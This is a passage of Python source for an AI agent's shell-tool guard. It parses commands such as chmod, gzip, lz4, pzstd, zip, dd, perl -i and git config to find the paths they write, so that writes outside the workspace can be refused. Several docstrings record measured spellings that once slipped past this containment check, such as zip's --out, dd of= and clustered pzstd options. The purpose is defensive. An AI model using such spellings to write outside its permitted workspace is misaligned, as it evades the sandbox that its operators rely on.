    command is aimed at. What GNU does with these two lines is *not* claimed here: this
    host's tools refuse both, and the GNU ground truth for ``-t`` is the measurement
    quoted above rather than a re-reading of it.
    """
    out: list[str] = []
    args = _args_after_command(tokens, i)
    table = _VERB_OPTIONS_WITH_VALUE[verb]
    idx = 0
    while idx < len(args):
        tok = args[idx]
        if tok == "--" and (
            idx == 0 or args[idx - 1] not in ("-t", "--target-directory")
        ):
            break
        eaten = 1
        if tok in ("-t", "--target-directory"):
            if idx + 1 < len(args):
                out.append(args[idx + 1])
            eaten = 2
        elif tok.startswith("--target-directory="):
            out.append(tok.split("=", 1)[1])
        else:
            short = _short_target_directory(tok, args, idx, table)
            if short is not None:
                value, attached = short
                if value:
                    out.append(value)
                eaten = _words_eaten(attached)
        idx += eaten
    return out


def _has_reference_flag(tokens: list[str], i: int) -> bool:
    """True when ``chmod``/``chown``/``chgrp`` was given ``--reference``.

    It decides how the operands are read rather than being one more option: with
    it the mode/owner comes from a file and *every* operand is a path; without
    it the first operand is the mode/owner and is not a path at all. A flag asked
    about by name must be read in both the spellings a caller can write, which is
    why the spaced and the ``=``-joined form are both tested here.
    """
    return any(
        tok == "--reference" or tok.startswith("--reference=")
        for tok in _args_after_command(tokens, i)
    )


def _metadata_write_targets(tokens: list[str], i: int, verb: str) -> list[str]:
    """The *files* whose metadata a ``chmod``/``chown``/``chgrp`` call rewrites.

    The command's own words are "change the mode / owner / group **of** these
    files", and the first operand is what to change *to* — a mode
    (``chmod 777 f``), an owner (``chown root f``), or an owner group
    (``chgrp staff f``). Naming it points the block at a token that is not a
    path: measured while fixing issue #1398, ``chown root <outside>/t`` reported
    the target ``root``.

    ``--reference=<f>`` is the one thing that turns that around, so the flag is
    asked about before the first operand is dropped. The two families differ in
    how the first operand is recognised: ``chmod``'s mode is recognised by
    *shape* (`777`, `u+x`, `=rx`) because a mode is written in a limited
    alphabet, while ``chown``/``chgrp``'s owner is dropped **by position** — it
    is not shape-recognisable (`root` has no shape and `1000:1000` is a name for
    an owner that an octal test would also accept).
    """
    args = _positional_args(tokens, i, _VERB_OPTIONS_WITH_VALUE[verb])
    if not args or _has_reference_flag(tokens, i):
        return args
    if verb == "chmod":
        return args[1:] if _MODE_LIKE_RE.match(args[0]) else args
    return args[1:]


def _compressor_operand_is_a_read(tokens: list[str], i: int) -> bool:
    """True when a compressor run does not write the file it was pointed at.

    Two ways to be a read, and both are named rather than assumed: the compressed
    (or decompressed) stream is sent to stdout (``-c``/``--stdout``/``--to-stdout``),
    or the file is only tested or listed (``-t``/``--test``, ``-l``/``--list``).
    Everything else in the family writes — the default form, ``-d`` (rewrite the
    decompressed file), ``-f``, ``-k`` (a second file beside the operand), ``-9`` —
    so the test asks about the *read*, which is the spelling somebody has to ask
    for, instead of about the write, which is what a bare ``gzip f`` already is.

    A short cluster is read letter by letter: `gzip -dc f.gz` is the `zcat`
    spelling, and a reader that knew only the spaced `-c` would refuse it.

    Named limit: an *attached value* that happens to contain one of the three
    letters (`gzip -Sc f` sets the suffix to `c`) is read as a read form, so that
    spelling is missed. Telling the two apart needs a per-compressor value table,
    which is the per-verb flag grammar this walk refuses to grow, and the two ways
    of guessing are not equally costly — guessing "write" here would refuse
    `gzip -9c`, a spelling people do type.
    """
    for tok in _args_after_command(tokens, i):
        if tok in _COMPRESSOR_READ_LONG:
            return True
        if not tok.startswith("-") or tok.startswith("--") or len(tok) < 2:
            continue
        if _COMPRESSOR_READ_LETTERS & set(tok[1:]):
            return True
    return False


def _without_the_stream_operand(targets: list[str]) -> list[str]:
    """``targets`` without the bare ``-`` — the operand that is not a path.

    A bare ``-`` is the convention for *standard input, standard output*: the
    program reads the stream and writes the stream, so no file is opened under
    that name and naming it turns a pure read into a refusal. This walk refuses
    in the direction its own record treats as the costlier one — an empty target
    list is a hole it can be argued out of, a refusal is a command a reader
    cannot run — so the operand is dropped rather than guessed at.

    Measured on this host 2026-09-19, one **fresh** directory per row with the
    input present and the listing read back off disk afterwards:

      gzip -  xz -  bzip2 -  zstd -  compress -  lz4 -     rc=0, no file created
      gzip -9 -   gzip -- -   xz -9 -   bzip2 -9 -         rc=0, no file created
      zstd -19 -  lz4 -9 -                                 rc=0, no file created
      gzip -d -                                            rc=1 (`unexpected end of
                                                            file`), no file created
      gzip - f    gzip f -    xz - f    zstd - f           `f` IS compressed —
                                                            `gzip - f` writes
                                                            `f.gz` and removes `f`

    The last row is why this is applied **per operand** and not per run, and why
    `_compressor_operand_is_a_read` is left alone: that gate answers once for the
    whole run, so teaching it the bare ``-`` would have made `gzip - f` name
    nothing at all — a hole, in exchange for nothing, since the operand beside
    the dash is a real path and must still be named. Dropping the token keeps
    ``['f']`` for that row and ``[]`` for `gzip -`.

    The drop is deliberately not made in ``_positional_args``, where it would
    reach every verb. A bare ``-`` is a *path* to the other writers, measured in
    the same geometry: `touch -`, `truncate -s0 -`, `mv src.txt -` and
    `cp src.txt -` each create the file named ``-`` (and `chmod 777 -` and `rm -`
    look one up), so a global drop would open exactly the hole the everyday
    writers are named to close. It is the compressor family's own spelling, and
    it is dropped where that is measured.
    """
    return [t for t in targets if t != "-"]


def _lz4_letters(args: list[str]) -> set[str]:
    """The short-option letters of an ``lz4`` run, read cluster by cluster.

    `-fb` is `-f -b` and `-B4` is `-B 4`, so a letter is looked for *inside* a
    token rather than only as a whole one — the same reading the family above
    gets. Case is kept: `-b` is the benchmark and `-B#` a block size.

    A value written *attached* is not a cluster: `-Ddict` is `-D` plus the
    dictionary's name, and the letters in that name are not flags. The scan stops
    at a value-taking letter, the shape `_perl_inplace_flag` already uses, because
    here the family's shared limit is sharper than for a compressor whose value is
    a suffix — `-D`'s value is a **path**, so an ordinary name like `cats` or
    `data.txt` used to read as `-c`/`-t` and the whole run as a read. Measured on
    the host's binary with the dictionary present: `lz4 -Ddata.txt f` and
    `lz4 -fDdata.txt f` are rc=0 and create `f.lz4`, while this reading named no
    target and both tiers allowed them (issue #1426).

    Only `-D` needs the stop, which is why the table is `-D`'s alone: the verb's
    other value-taking letters (`-B#`, `-T#`) take a *number*, and a digit is
    neither a read letter nor a multi-input one. The spaced spelling is untouched
    because it is not a miss — measured, `lz4 -D -c f` is rc=27 and creates
    nothing (`-c: No such file or directory`, the next token being the value).
    """
    letters: set[str] = set()
    for tok in args:
        if tok.startswith("-") and not tok.startswith("--") and len(tok) >= 2:
            for ch in tok[1:]:
                letters.add(ch)
                if ch in _LZ4_VALUE_TAKING_SHORT:
                    break
    return letters


def _lz4_write_targets(tokens: list[str], i: int) -> list[str]:
    """The path an ``lz4`` run creates — a sibling of the operand, or nothing.

    `lz4` differs from the compressor family in *which* path it writes, so this
    asks the two questions the measured table (`_LZ4_VERBS`' comment) settles:
    is the run one of the read forms, and is it a multi-input run?

    * a read form (`-c`/`-t`/`-b` and their long spellings) creates nothing, so
      naming its operand would refuse a pure read;
    * under `-m`/`-r` every operand is an input and each derives its own sibling,
      so all of them are named;
    * otherwise the *last* operand is written — exactly the explicit destination
      of `lz4 f out.lz4`, and for the single-operand form the operand itself,
      whose directory is where the derived sibling lands.

    A bare ``-`` operand is the stream, in either position, and is never named;
    which operand it is takes the third bullet with it. Measured in one fresh
    directory per row with only `f` present and the listing read back off disk
    (2026-09-19): `lz4 -`, `lz4 - -`, `lz4 -t -` and **`lz4 f -`** all create no
    file — the last one names stdout as its destination, so nothing is written
    beside `f` either — while `lz4 -m f -` really does derive `f.lz4`, which is
    why the multi-input branch drops the token and keeps `f`. See
    `_without_the_stream_operand`.
    """
    args = _args_after_command(tokens, i)
    letters = _lz4_letters(args)
    if letters & _LZ4_READ_LETTERS or any(t in _LZ4_READ_LONG for t in args):
        return []
    operands = _positional_args(tokens, i, _LZ4_OPTIONS_WITH_VALUE)
    if letters & _LZ4_MULTI_LETTERS or any(t in _LZ4_MULTI_LONG for t in args):
        return _without_the_stream_operand(operands)
    if operands and operands[-1] == "-":
        # `lz4 f -` names stdout as its destination instead of writing `f.lz4`
        # beside the operand, so nothing on disk is written under *any* operand
        # and the last-operand rule has to answer with nothing rather than with
        # the operand it would otherwise fall back on (`f`, which it only reads).
        return []
    return operands[-1:]


def _pzstd_read_form(args: list[str]) -> bool:
    """True when a ``pzstd`` run sends its bytes to stdout or only inspects them.

    Read cluster by cluster, like the family's gate, with one difference that
    decides whether this branch works at all: the scan **stops at a
    value-taking letter**, so the attached destination `-oout.zst` is not read as
    `-o` followed by the flags `t`, `o` and `t` again out of the *file name*. That
    reading would turn a real destination into "read, nothing named" and reopen
    the hole from the inside. The stop is the idiom `_lz4_letters` uses for `-D`.

    The long forms are matched exactly rather than by prefix, and a token that is
    not a short-option cluster (`--processes 4`, an operand) is skipped — a
    *value* is never a cluster.

    Asked only once no destination has been spelled, because the two readings are
    **not** alternatives in the direction a family-wide gate would assume: measured
    2026-09-20 on this host, `pzstd -co out.zst f` exits 0 with 0 bytes on stdout and
    `out.zst` written, so a read letter in front of `-o` does not make the run a
    read (`pzstd -c f` alone does — 31 bytes on stdout, no file). The family's own
    gate, which answers "read" from the first read letter it sees, is what this
    ordering exists to keep away from that spelling.
    """
    for tok in args:
        if tok in _PZSTD_READ_LONG:
            return True
        if not tok.startswith("-") or tok.startswith("--") or len(tok) < 2:
            continue
        for ch in tok[1:]:
            if ch in _PZSTD_READ_LETTERS:
                return True
            if ch in _PZSTD_VALUE_TAKING_SHORT:
                break
    return False


def _pzstd_names_a_destination(args: list[str]) -> bool:
    """True when the run spells the destination option, whatever its value.

    The distinction this draws is ``pzstd -o - f`` from ``pzstd f``. Both leave
    the destination option's value unnamed by ``_option_destination_values`` — it
    drops a value of exactly ``-`` because that is how these options mean
    *stdout* — but they differ in what the run then does: `-o -` sends the bytes
    to stdout and writes **no file**, while a bare `pzstd f` derives `f.zst` beside
    the operand. Falling through to the operand rule for both would name `f` in the
    first case too, i.e. refuse a pure read, measured rc=0 with the directory
    unchanged.

    The option is found by the same reader the value extractor uses — the shared
    cluster scan over this verb's value-taking letters — so the two cannot disagree
    about which run has a destination: any spelling the extractor reads a value from
    (`-o <v>`, `-o<v>`, and a cluster like `-qo <v>`) is a destination *spelled* here,
    whether or not its value is one this walk may name (`-qo - f` is stdout, and the
    answer is then "nothing", not `f`).

    Unlike `_option_destination_values` and `_target_directory_values`, this reader does
    **not** step over a word another value-taking letter ate (issue #1455), and the
    measurement is why: the only other value-taking short letter is `p`, whose value
    pzstd requires to be a **number** — so a run in which `-p` ate `-o` cannot succeed,
    and the answer "a destination is spelled" (which names *nothing*, see
    `_pzstd_write_targets`) is right for it. Measured 2026-09-20 on this host, one fresh
    directory per row, the listing read back off disk:

      ``pzstd -p -o out.zst f``          rc=1  ``Option -p expects a number, but -o
                                                provided``, nothing created
      ``pzstd --processes -o out.zst f`` rc=1  the same, via the long form
      ``pzstd -M 1 -o out.zst f``        rc=1  ``Invalid argument: -M``, nothing created
      ``pzstd -T 2 -o out.zst f``        rc=1  ``Invalid argument: -T``, nothing created
      ``pzstd -D dict -o out.zst f``     rc=1  ``Operation not supported: Zstd
                                                dictionaries``, nothing created
      ``pzstd -p 2 -o out2.zst f``       rc=0  ``out2.zst`` created   (control)

    Every other value-taking spelling is refused by pzstd itself (its front-end
    implements no `-M`/`-T`/`-D`), so an unlisted value-taking letter — the residual
    issue #1420 is about — cannot hide a write here either. Stepping *would* change the
    verdict, in the wrong direction: with the eaten `-o` skipped the run falls through
    to the operand rule, which names the operands a failed run never writes, i.e. a
    **false block** in the geometry above. Revisit this paragraph if pzstd ever gains a
    value-taking letter that accepts arbitrary text.
    """
    for j, tok in enumerate(args):
        if tok == "--":
            break
        cluster = _short_cluster_option(tok, args, j, _PZSTD_VALUE_TAKING_SHORT)
        if cluster is not None and cluster[0] == "o":
            return True
    return False


def _pzstd_write_targets(tokens: list[str], i: int) -> list[str]:
    """The path a ``pzstd`` run writes — its ``-o`` destination, or a sibling.

    `pzstd` keeps the operand and derives a sibling beside it (`f` → `f.zst`), so
    this is `lz4`'s shape rather than the in-place family's; the measured table
    behind every claim here is above `_PZSTD_VERBS`. Three questions settle it, in
    this order:

    * does it spell `-o`? then that option holds the destination and the operands
      are only read — so the destination is named and they are not, which is also
      why `pzstd -o - f` answers with nothing rather than with `f`. Every spelling
      of the option counts, the clustered one included (`pzstd -qo out.zst f` names
      `out.zst` and then stops), which is what this verb passes its value-taking
      letters to the extractor for. This question comes **first** because it wins a
      disagreement the read gate would otherwise settle the other way: measured,
      `pzstd -co out.zst f` is rc=0 with **0 bytes on stdout** and `out.zst` written,
      so a read letter in front of the destination does not make the run a read;
    * is it a read form (`-c`/`--stdout`, `-t`/`--test`, `-l`/`--list`, the letters
      read inside a short cluster too) when no destination is spelled? then it writes
      nothing, and naming the operand would refuse a pure read;
    * otherwise every operand derives its own sibling (`pzstd f g` writes `f.zst`
      and `g.zst`), so all of them are named, minus the bare ``-``.

    One named limit, measured, checked in `tests/test_bash_tool_pzstd_targets.py` so
    it is not a surprise later: a stream operand beside a file (`pzstd - f`) is
    dropped, as in the family, leaving `f` named although the run aborts with rc=1
    and writes nothing — an over-name, which is the direction this walk prefers to
    err in.

    The clustered spelling used to be a limit too, and it was measured to be the
    *hole* direction rather than this one once the cluster value rule landed on
    master (#1443): `pzstd -qo <out>/out.zst <ws>/f` then reported `['<ws>/f']`,
    i.e. the operand walk correctly ate `out.zst` as `-o`'s value while this rule —
    reading only a leading letter — named the destination by nothing, and the write
    outside the workspace was allowed. That is why the letters are passed here and
    why the seam asks the same cluster question: the two readers have to agree about
    which token carries the value.
    """
    args = _args_after_command(tokens, i)
    destinations = _option_destination_values(
        tokens, i, "pzstd", _PZSTD_DESTINATION_OPTIONS, _PZSTD_VALUE_TAKING_SHORT
    )
    if destinations:
        return destinations
    if _pzstd_names_a_destination(args):
        return []
    if _pzstd_read_form(args):
        return []
    return _without_the_stream_operand(
        _positional_args(tokens, i, _PZSTD_OPTIONS_WITH_VALUE)
    )


def _zip_logfile_targets(words: list[str]) -> list[str]:
    """The path ``zip -lf <path>`` writes, in both measured spellings.

    The rows behind this are consequence 6 of the table above
    `_ZIP_OPTIONS_WITH_VALUE`. ``-lf`` is the family's one spaced value that is
    itself a **path**, so it is a write the archive rule cannot reach: the option
    consumes the token (it is not an operand, so nothing in the operand walk sees
    it) while zip opens it as a logfile. It is named in **every** shape of the
    run, because it is written in every shape measured — the read spellings
    (``zip -sf -lf ./log a.zip`` printed its listing and still created ``log.log``)
    and the exit-12 "Nothing to do!" case (``zip -lf ./log a.zip``) included.

    ``zip`` appends ``.log`` when the value does not end in it, which lands in the
    same directory as the token named here, so naming the token as written is
    containment-equivalent — the question a block asks.

    ``-Z <cm>`` and ``-tt <date>`` are handled by the table alone: their values are
    never paths, so consuming them is the whole rule.
    """
    out: list[str] = []
    for idx, tok in enumerate(words):
        if tok == "--":
            break
        if tok == "-lf":
            if idx + 1 < len(words):
                out.append(words[idx + 1])
        elif tok.startswith("-lf"):
            out.append(tok[3:])
    return out


# The letters the copy-mode destination scan stops at, and they are zip's **own**
# value-taking letters rather than `O` alone: in `-bO` the `b` takes `O` as its
# temporary directory, so the scan must see `b` first and answer with it — a
# `{O}`-only set would call that token a destination and name a path the run only
# reads. Measured on the host's binary, 2026-09-20: `zip -bO -U src.zip --out o.zip`
# fails with `Temporary file failure (O/ziqqV8zD)` — i.e. zip really did use `O` as
# the temp directory — while a bare `-b` reports "option 'b' (dir to use for temp
# archive) requires a value" and takes nothing; and `zip -b <missing dir> ...` is the
# same rc=10 failure `-bO` is. Derived from the two tables rather than written out, so
# a letter added to either cannot be read in the spaced spelling and silently not in
# the clustered one.
_ZIP_OUT_CLUSTER_LETTERS = _short_option_letters(
    _ZIP_OPTIONS_WITH_VALUE | _ZIP_DESTINATION_OPTIONS
)


def _zip_out_values(words: list[str]) -> list[str]:
    """The path a copy-mode ``zip`` run writes: ``--out <archive>`` (short ``-O``).

    The measurements behind it are the comment above `_ZIP_DESTINATION_OPTIONS`, and
    the rule they settle is one line per spelling — the next word for ``--out`` and
    ``-O``, the text after ``=`` for ``--out=``, and for every **short** spelling,
    clustered included, whatever the shared reader says carries the letter (``-UO
    out.zip`` and ``-UOout.zip`` are both copy runs, measured). An **empty** value is
    dropped rather than named: a token that names nothing resolves to the cwd, so
    naming it would refuse every run made from a working directory outside the
    workspace. Parsing stops at ``--``, because everything after it is an operand —
    the case `_positional_args` documents at length. A spelling with no value at all
    (``-O`` as the last token) is skipped for the same reason the empty one is.

    The cluster is read by `_short_cluster_option` rather than by a scan of this
    function's own, and that is the whole point of the shared reader: the operand
    walk asks it the same question for the same token, so the two cannot disagree
    about which spelling carries a value. A destination this function finds is what
    makes the caller hand that walk a table containing ``-O``, which is in turn what
    consumes the value's word instead of naming it an operand — the second half
    issue #1441 needed, and the reason fixing only this half would have left the
    destination named *beside* a source that is only read.

    Only the *path* is returned. That this path is written, and that the operands are
    therefore reads, is the caller's rule — `_zip_write_targets` is the only caller,
    and the same measurement decides both halves.
    """
    out: list[str] = []
    idx = 0
    while idx < len(words):
        tok = words[idx]
        if tok == "--":
            break
        value: str | None = None
        eaten = 1
        if tok in _ZIP_DESTINATION_OPTIONS:
            value = words[idx + 1] if idx + 1 < len(words) else None
            eaten = 2
        elif tok.startswith("--out="):
            value = tok[len("--out="):]
        else:
            cluster = _short_cluster_option(tok, words, idx, _ZIP_OUT_CLUSTER_LETTERS)
            if cluster is not None:
                letter, value, attached = cluster
                # Any other letter's value is not a path here, but its word is still
                # *eaten*: skip it rather than let it be read as a destination itself
                # (`-b -Osrc.zip` is a temporary directory named `-Osrc.zip`, not a
                # source run writing `src.zip` — pinned, with the arm, in
                # `tests/test_bash_tool_zip_archive.py`, issue #1454).
                if letter != "O":
                    value = None
                eaten = _words_eaten(attached)
        if value:
            out.append(value)
        idx += eaten
    return out


def _zip_write_targets(tokens: list[str], i: int) -> list[str]:
    """The paths a ``zip`` run writes: its **first** operand, and what it moves.

    The measured table is the comment above `_ZIP_OPTIONS_WITH_VALUE`; the rule it
    settles is five lines long, and each line is one of its rows:

    * a read spelling (``-sf``/``--show-files``, ``-su``/``-sU``, the help and
      licence forms) writes no archive — the ``-lf`` logfile is the exception,
      written in every shape (see `_zip_logfile_targets`);
    * with no second operand the run writes nothing at all (exit 12, "Nothing to
      do!"), which is what keeps `zip a.zip` and `zip -d a.zip` allowed — the same
      logfile exception applies there too;
    * otherwise the archive — the *first* operand — is the path that is created
      or rewritten, and under ``-m``/``--move`` every listed operand after it is
      removed as well;
    * **unless the run is copy mode**, whose destination is an option's value and
      whose operands are all reads: named by `_zip_out_values`, and the first
      operand is not named at all (the paragraph on ``--out`` below);
    * and the ``-lf`` value is named alongside whichever of the above applies.

    Named limit: the exclusion list (``-x``) and the include list (``-i``) are
    matched against the operands **by name**, and a name they neutralise is still
    named here. Measured, `zip -m a.zip f -x f` writes nothing, so the over-block
    lands on a run that does nothing anyway; the alternative is a per-name match
    in the walk, the grammar this family of rules refuses to grow (see
    `_rsync_run_is_a_read` for the same trade taken the other way). `-@` reads its
    names from stdin, which the walk cannot see: that spelling stays unnamed.

    ``-b <dir>`` (the temporary directory, a spaced value this rule drops) is
    deliberately not named, and that is a measurement rather than an omission:
    taken in a scratch directory, `zip -b <dir> a.zip f` left the directory
    **empty** afterwards, and so did a run that failed — the temporary archive is
    removed before the process exits, so there is no surviving path to protect.

    ``--out <archive>``/``-O <archive>`` is the family's fifth rule line and the only
    one that reads an option's value as a **path**. Measured on the same binary:
    ``zip -U src.zip --out out.zip`` is rc=0, creates ``out.zip`` and leaves
    ``src.zip`` untouched — so under it the operands are **reads** (the source archive
    and the member patterns) and this walk must not name them. Before this rule the
    walk named the first operand, which was wrong in both directions (measured through
    this predicate at ``workspace-write``):
    ``zip -U /workspace/src.zip --out /outside/emrg/o.zip`` was **allowed** while
    naming the source, so the archive really written outside every allowed root was
    named by nothing; and ``zip -U /outside/emrg/src.zip --out /workspace/o.zip`` was
    **blocked on the read**. Adding ``--out`` to the table above would have fixed
    neither — the table means "consumes the next token, which is not a path", and this
    value *is* the destination, so the operand before it would be named again.

    Copy mode has two halves, and each is a measurement rather than an assumption: the
    **destination is the only path written**, and the **operands are reads**. ``--out``
    implies copy mode on its own, so ``-U`` is not part of the rule, and the modes that
    could contradict the first half were checked against it — ``zip -d src.zip member
    --out new.zip`` is rc=0 with the source **byte-identical** afterwards and its member
    list unchanged (under ``--out`` even a deleting mode edits the copy), while ``-m``
    is inert (zip warns "can't set method, move, recurse, or comments with copy mode",
    and the member is still on disk), so neither adds an operand to the list. Named
    lists, each measured: ``-U`` **combined with an action flag** (``-d``, ``-u``,
    ``-f``) is rejected by zip — rc=16, "Invalid command arguments (specify just one
    action)", nothing written — so the destination named there is an over-block on a
    contradictory command line (the same action *without* ``-U`` is the workable
    spelling, measured above); an **empty** value (``--out=``), which writes nothing
    anywhere and is therefore named by nothing; and a **member pattern that matches
    nothing**, or a member already up to date (exit 12 either way), where the
    destination is still named — what a run will do is not decidable from the command
    line, the same approximation the archive forms above take.
    """
    words = _args_after_command(tokens, i)
    logfile = _zip_logfile_targets(words)
    if any(tok in _ZIP_READ_TOKENS for tok in words):
        return logfile
    destination = _zip_out_values(words)
    # In copy mode the destination is an option's value and every operand is a read
    # (the source archive, then the member patterns), so the destination has to be
    # consumed before the operand walk sees it — and the question that walk then
    # answers for this branch is only "is there a source archive at all?", which is
    # what keeps `zip --out o.zip` (rc=9, nothing written) unnamed. The cluster
    # letters go with the table so a *clustered* destination's word is eaten by this
    # walk exactly as it is read by `_zip_out_values`: the same token must not be a
    # destination to one reader and an operand to the other (issue #1441).
    operands = _positional_args(
        tokens,
        i,
        _ZIP_OPTIONS_WITH_VALUE | _ZIP_DESTINATION_OPTIONS
        if destination
        else _ZIP_OPTIONS_WITH_VALUE,
        _ZIP_OUT_CLUSTER_LETTERS if destination else frozenset(),
    )
    if destination and operands:
        return destination + logfile
    if len(operands) < 2:
        # Archive and no list: zip exits 12 having written nothing — the logfile
        # excepted, which it really does create (measured).
        return logfile
    if any(tok in _ZIP_MOVE_FLAGS for tok in words):
        return operands + logfile
    return operands[:1] + logfile


def _is_directory_install(tokens: list[str], i: int) -> bool:
    """True when an ``install`` invocation creates directories (``-d``).

    Under ``-d`` every operand is a directory to create, so the last-operand
    rule would name one of them and let the others past.
    """
    return any(t in ("-d", "--directory") for t in _args_after_command(tokens, i))


def _dd_output_targets(tokens: list[str], i: int) -> list[str]:
    """The path ``dd of=<path>`` writes.

    ``of=`` is where dd's destination lives and it is not an operand position, so
    no operand rule reaches it — measured on master, `dd of=<outside>/d` was
    ALLOW and really wrote. ``if=`` is dd's *read* side and is never named.
    """
    return [
        tok[3:] for tok in _args_after_command(tokens, i) if tok.startswith("of=")
    ]


# `perl`'s short options that take a value: `-e`/`-E` (the program text), `-I`
# (an include directory), `-M`/`-m` (a module) and `-0` (the record separator).
# Everything that follows one of them **inside the same token** is that option's
# value and not another option letter, which is why `-Idir` is not an in-place
# flag even though it contains an `i`.
_PERL_VALUE_TAKING_SHORT = frozenset("eEIMm0")


def _perl_inplace_flag(tok: str) -> bool:
    """True when this ``perl`` token asks for an in-place rewrite (``-i``).

    ``-i`` takes an *optional attached* suffix (``-i.bak``), so the letter has to
    be found inside a cluster rather than compared as a whole token: ``-pi``,
    ``-ni.bak`` and ``-ie`` are all in-place runs. Scanning stops at a
    value-taking option, so an attached value that happens to contain an ``i``
    (``-Idir``, ``-Mstrict``) is not mistaken for the flag.
    """
    if not tok.startswith("-") or tok.startswith("--") or len(tok) < 2:
        return False
    for ch in tok[1:]:
        if ch == "i":
            return True
        if ch == "." or ch in _PERL_VALUE_TAKING_SHORT:
            return False
    return False


def _perl_carries_the_program(tok: str) -> bool:
    """True when this ``perl`` token introduces or carries the program **text**.

    The program is not a path, and naming it is the defect the ``sed`` branch
    already avoids for its script (``sed -i s/a/b/ f.txt`` → ``s/a/b/``). Both
    spellings exist and they differ in where the program sits: ``-e PROG``,
    ``-pe PROG`` and ``-ie PROG`` put it in the *next* token, while ``-ePROG``
    carries it in the same token.
    """
    if not tok.startswith("-") or tok.startswith("--") or len(tok) < 2:
        return False
    for ch in tok[1:]:
        if ch in "eE":
            return True
        if ch in _PERL_VALUE_TAKING_SHORT:
            return False
    return False


def _perl_replacement_operands(tokens: list[str], i: int) -> list[str]:
    """The files a ``perl -i`` run rewrites in place.

    Measured on this host (perl 5.34.1, 2026-09-19), in a scratch tree with every
    file's bytes read back off disk: ``perl -i -pe 's/a/b/' f`` rewrites ``f``
    (rc=0, ``aaa`` → ``baa``), ``perl -pi -e 's/a/b/' f`` does the same,
    ``perl -i.bak -pe 's/a/b/' g`` rewrites ``g`` *and* leaves the original in
    ``g.bak``, and the control ``perl -pe 's/a/b/' f4`` (no ``-i``) leaves ``f4``
    untouched. The program is not a file in any of those rows.

    Two spellings put the program in an operand position, and both were measured:

    * ``-e PROG`` / ``-pe PROG`` — the program is the token *after* the option;
    * with **no** ``-e``/``-E`` at all, ``perl -i -p script.pl f`` runs
      ``script.pl`` as the program (measured: ``f`` became ``baa`` while
      ``script.pl`` kept its bytes), so the first operand is the program in
      exactly the way ``sed``'s first operand is its script.

    A lone ``--`` ends option parsing, as it does for ``_positional_args``.
    """
    operands: list[str] = []
    program_is_an_option = False
    skip_next = False
    for tok in _args_after_command(tokens, i):
        if skip_next:
            skip_next = False
            continue
        if tok == "--":
            continue                      # ends option parsing; operands follow
        if tok.startswith("-") and len(tok) > 1:
            if _perl_carries_the_program(tok):
                program_is_an_option = True
                # `-e PROG` and `-pe PROG`: the program is the next token. An
                # attached `-ePROG` carries it in the same token, so nothing is
                # skipped there.
                skip_next = tok[-1] in "eE"
            continue
        if tok == "-":
            # Measured: perl opens a lone `-` as a *file* and fails ("Can't open
            # -: No such file or directory") without writing anything, which is
            # the same reading `_option_destination_values` gives a destination
            # of exactly `-`. A file really named `-` is spelled `./-`, and that
            # token is named like any other.
            continue
        operands.append(tok)
    return operands if program_is_an_option else operands[1:]


def _git_output_flag_targets(tokens: list[str], i: int) -> list[str]:
    """Write targets named by a git invocation's ``--output[=]<file>`` flag.

    Scoped to ``git`` on purpose. The tokenizer dequotes, so a global test on
    the token cannot distinguish the option from the same characters inside a
    string literal (``echo "--output=x"`` tokenizes to the same
    ``--output=x``), and a guard that refuses a command for *mentioning* the
    flag is the spelling-vs-effect defect fixed in #1162. As a git option the
    flag has a real position, so it is read only where git would read it.

    **Where git reads it** is the subcommand's own argument list, and that is asked
    of ``_git_invocation_at`` rather than re-derived here. This reader used to scan
    every token after ``git``, which is a second copy of the walk that finds the verb
    — and it read a word a *global* option had already eaten as a flag: measured on
    this host (git 2.50.1) in one fresh repository per row,

      ``git diff --output=x``          rc=0  ``x`` written (105 B)   the real write this reads for
      ``git -C . diff --output=x``     rc=0  ``x`` written — a global option *with a value*
                                             before the flag does not hide it
      ``git diff --output x``          rc=0  ``x`` written — the spaced form is real
      ``git -c --output=x diff``       rc=128 ``error: key does not contain a section: --output``,
                                             nothing written — ``-c`` took the whole token as its
                                             config string, so no output flag was in force
      ``git --output=x diff``          rc=129 ``unknown option``, nothing written — git has no
                                             *global* ``--output`` (its usage line lists none)
      ``git status --output=x``        rc=129 ``unknown option``, nothing written

    Every rc≠0 row above names a path the run never writes, and the direction is the
    expensive one: a name outside the allowed roots refuses the command, so the guard
    blocked a run that changes no byte (issue #1464, which measured the ``-c`` row and
    called the global-position one a control; the executed arm above says that control
    writes nothing either). Every token the flag can really occupy lies inside ``rest``,
    so one walk answers the question instead of two — the converse is not claimed:
    ``git status --output=x`` is inside ``rest`` too and git refuses the flag, a
    per-verb table this walk does not carry and a limit pinned, rather than guessed at,
    in ``tests/test_bash_tool_git_output_flag.py``.
    """
    inv = _git_invocation_at(tokens, i)
    if inv is None:
        return []                  # a bare `git`, or one followed only by global options
    _index, _verb, args = inv
    out: list[str] = []
    for j, tok in enumerate(args):
        if not _OUTPUT_FLAG_RE.match(tok):
            continue
        attached = tok.split("=", 1)[1] if "=" in tok else ""
        if attached:
            out.append(attached)
        elif j + 1 < len(args):
            out.append(args[j + 1])          # `--output <file>`
    return out


def _git_config_write_targets(tokens: list[str], i: int) -> list[str]:
    """The file a *writing* ``git config`` invocation writes.

    `git config` is the one git verb whose file operand is not the working tree,
    and both of its shapes leave a workspace: ``--file <p>`` / ``-f <p>`` writes
    exactly ``<p>``, while ``--global`` / ``--system`` writes the user's or the
    system's config. Neither was visible to the walk, so workspace-write — whose
    stated job is to refuse absolute targets outside the workspace root —
    answered ALLOW with an empty target list. Measured on master `0ff41174aaceb978`
    against git 2.50.1: all four `--file`/`-f` spellings, `--global`, `--system`,
    a global option before the verb (`git -c x=1 config …`), an `env` wrapper and
    a `sh -c` wrapper were all allowed, and git really created the named file in
    each case. The *verb* was already a mutator at read-only, so read-only was
    never the tier with the hole — the untested tier was the one every cycle
    actually runs in.

    Only a **writing** invocation names a target, and the verdict comes from
    `_git_invocation_is_mutator` rather than from a second opinion about the
    flags: `git config --global --get user.name` is the identity check every
    cycle is told to run, and `git config --file <p> --get k` reads a file it
    must not be refused for *reading*. Naming a target for either would trade
    this hole for a new over-block and protect nothing.

    `--global` / `--system` are named by the file git writes by default
    (`~/.gitconfig`, `/etc/gitconfig`). git honours `GIT_CONFIG_GLOBAL`,
    `XDG_CONFIG_HOME` and a build prefix, any of which moves that file — but
    never inside a workspace, so the verdict this feeds (target outside the write
    roots ⇒ refuse) is the same one under every spelling.
    """
    inv = _git_invocation_at(tokens, i)
    if inv is None:
        return []
    _, verb, rest = inv
    if verb != "config":
        return []
    if _git_invocation_is_mutator(verb, rest) is None:
        return []                       # a read names no file it writes
    for j, tok in enumerate(rest):
